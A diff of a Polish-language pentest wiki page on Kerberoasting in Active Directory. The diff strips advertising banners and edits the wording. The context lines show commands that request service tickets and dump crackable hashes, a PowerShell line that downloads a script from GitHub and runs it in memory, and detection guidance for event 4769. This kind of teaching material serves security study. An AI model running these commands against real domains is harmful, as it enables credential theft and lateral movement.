@@ -1,18 +1,10 @@
 # Kerberoast
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
-Uzyskaj dostęp już dziś:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
-
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Kerberoast
 
-Kerberoasting koncentruje się na pozyskiwaniu **biletów TGS**, szczególnie tych związanych z usługami działającymi na **konta użytkowników** w **Active Directory (AD)**, z wyłączeniem **konta komputerów**. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **haseł użytkowników**, co umożliwia **łamanie poświadczeń offline**. Użycie konta użytkownika jako usługi wskazuje na niepustą właściwość **"ServicePrincipalName"**.
+Kerberoasting koncentruje się na pozyskiwaniu **biletów TGS**, szczególnie tych związanych z usługami działającymi pod **konto użytkownika** w **Active Directory (AD)**, z wyłączeniem **kont komputerów**. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **haseł użytkowników**, co umożliwia **łamanie poświadczeń offline**. Użycie konta użytkownika jako usługi wskazuje na niepustą właściwość **"ServicePrincipalName"**.
 
 Aby wykonać **Kerberoasting**, niezbędne jest konto domenowe zdolne do żądania **biletów TGS**; jednak proces ten nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego z **ważnymi poświadczeniami domenowymi**.
 
@@ -21,7 +13,7 @@ Aby wykonać **Kerberoasting**, niezbędne jest konto domenowe zdolne do żądan
 - **Kerberoasting** celuje w **bilety TGS** dla **usług kont użytkowników** w **AD**.
 - Bilety szyfrowane kluczami z **haseł użytkowników** mogą być **łamane offline**.
 - Usługa jest identyfikowana przez **ServicePrincipalName**, który nie jest pusty.
-- **Nie są potrzebne specjalne uprawnienia**, tylko **ważne poświadczenia domenowe**.
+- **Nie są potrzebne specjalne uprawnienia**, wystarczą **ważne poświadczenia domenowe**.
 
 ### **Atak**
 
@@ -40,7 +32,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Narzędzia wielofunkcyjne, w tym zrzut użytkowników podatnych na kerberoasting:
+Narzędzia wielofunkcyjne, w tym zrzut użytkowników nadających się do kerberoast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -91,15 +83,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 > [!WARNING]
-> Gdy żądany jest TGS, generowane jest zdarzenie systemu Windows `4769 - A Kerberos service ticket was requested`.
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społeczności na świecie.\
-Uzyskaj dostęp już dziś:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
+> Gdy żądany jest TGS, generowane jest zdarzenie systemu Windows `4769 - Żądano biletu usługi Kerberos`.
 
 ### Łamanie
 ```bash
@@ -126,7 +110,7 @@ Kerberoasting może być przeprowadzany z wysokim stopniem dyskrecji, jeśli jes
 
 - Nazwa usługi nie powinna być **krbtgt**, ponieważ jest to normalne żądanie.
 - Nazwy usług kończące się na **$** powinny być wykluczone, aby uniknąć uwzględnienia kont maszynowych używanych do usług.
-- Żądania z maszyn powinny być filtrowane przez wykluczenie nazw kont sformatowanych jako **machine@domain**.
+- Żądania z maszyn powinny być filtrowane poprzez wykluczenie nazw kont sformatowanych jako **machine@domain**.
 - Należy brać pod uwagę tylko udane żądania biletów, identyfikowane przez kod błędu **'0x0'**.
 - **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, który jest często używany w atakach Kerberoasting.
 ```bash
@@ -141,7 +125,7 @@ Wdrażając te środki, organizacje mogą znacznie zmniejszyć ryzyko związane 
 
 ## Kerberoast bez konta domenowego
 
-W **wrześniu 2022** roku nowy sposób na wykorzystanie systemu został ujawniony przez badacza o imieniu Charlie Clark, udostępniony na jego platformie [exploit.ph](https://exploit.ph/). Metoda ta pozwala na pozyskanie **Biletów Serwisowych (ST)** za pomocą żądania **KRB_AS_REQ**, które w niezwykły sposób nie wymaga kontroli nad żadnym kontem Active Directory. Zasadniczo, jeśli główny obiekt jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji—scenariusz podobny do tego, co w dziedzinie cyberbezpieczeństwa nazywane jest atakiem **AS-REP Roasting**—ta cecha może być wykorzystana do manipulacji procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w treści żądania, system jest oszukiwany do wydania **ST** zamiast standardowego zaszyfrowanego Biletu Grantującego (TGT).
+W **wrześniu 2022** roku nowy sposób na wykorzystanie systemu został ujawniony przez badacza o imieniu Charlie Clark, udostępniony na jego platformie [exploit.ph](https://exploit.ph/). Metoda ta pozwala na pozyskanie **Biletów Serwisowych (ST)** za pomocą żądania **KRB_AS_REQ**, które w sposób niezwykły nie wymaga kontroli nad żadnym kontem Active Directory. Zasadniczo, jeśli główny podmiot jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji—scenariusz podobny do tego, co w dziedzinie cyberbezpieczeństwa nazywa się atakiem **AS-REP Roasting**—ta cecha może być wykorzystana do manipulacji procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w treści żądania, system jest oszukiwany do wydania **ST** zamiast standardowego zaszyfrowanego Biletu Grantującego (TGT).
 
 Technika jest w pełni wyjaśniona w tym artykule: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -167,11 +151,3 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społeczności na świecie.\
-Uzyskaj dostęp już dziś:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
